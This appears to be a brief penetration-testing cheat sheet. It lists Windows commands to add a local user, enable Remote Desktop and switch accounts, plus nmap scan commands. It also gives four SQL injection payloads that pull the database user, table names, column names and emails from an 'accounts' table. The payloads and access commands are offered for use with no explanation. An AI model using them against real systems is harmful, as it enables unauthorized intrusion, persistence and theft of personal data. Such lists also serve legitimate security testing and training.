
### Windows Commands

1. Create user, the command is 
net user {username} {password}


examples:

```CMD
net user lucas pw1234
```

2. Eable remote desktop service 

```CMD
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

3. Switch user

```CMD
runas /user:lucas cmd
```

### NMAP Command

1. Common ports 
```CMD
nmap -sS -P0  -A -oA 192.168.100.1 -T4 192.168.100.1
```

2. Full ports
```CMD
 nmap -sS -P0 -p- -A -oA 192.168.100.1.log -T4 192.168.100.1
```

### Common SQL Injection Command
	
	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2,user()  --%20

	
	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1 )--%20


	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT column_name FROM information_schema.columns WHERE table_name='accounts' limit 0,1 )--%20


	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT email FROM   accounts limit 0,1 )--%20

### Linux Command

1. base64 decode
```SH
echo "aGVsbG8=" | base64 -d 
```
